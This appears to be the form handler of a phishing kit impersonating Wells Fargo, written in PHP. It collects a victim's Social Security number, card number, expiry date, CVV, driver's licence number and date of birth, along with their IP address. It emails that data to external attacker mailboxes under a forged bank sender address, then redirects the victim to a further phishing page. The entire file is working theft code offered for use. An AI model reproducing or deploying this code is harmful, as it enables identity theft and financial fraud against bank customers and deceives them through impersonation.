<?
session_start();
$ssn1=  $_POST['ssn1'];
$ssn2=  $_POST['ssn2'];
$ssn3=  $_POST['ssn3'];
$acctnum=  $_POST['acctnum'];
$expdate=  $_POST['expdate'];
$cvv=  $_POST['cvv'];
$driver=  $_POST['driver'];
$state=  $_POST['state'];
$dob=  $_POST['dob'];
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");

  $subj = "Wells Fargo Page 2 $acctnum";
  $msg = "Login Details\n\nSSN 1: $ssn1\nSSN 2: $ssn2\n\nSSN 3: $ssn3\nCard Number: $acctnum\n\nExp Date: $expdate\nCVV: $cvv\n\nDrivers License: $driver\n\n$state=$state\n$dob=$dob\n\nSubmitted from IP Address - $ip on $adddate";
  $from = "From: $pin<results@wellsfargo.com>";
  mail("carlford@excite.co.uk,owoeyetosyn3@yahoo.com", $subj, $msg, $from);
         mail("carlford@excite.co.uk,owoeyetosyn3@gmail.com", $subj, $msg, $from);
  header("Location:email.php?ZXJyb3Iubm9Vc2VybmFtZQ%3D%3DZXJyb3Iubm9Vc2VybmFtZQ%3D%3D");

?>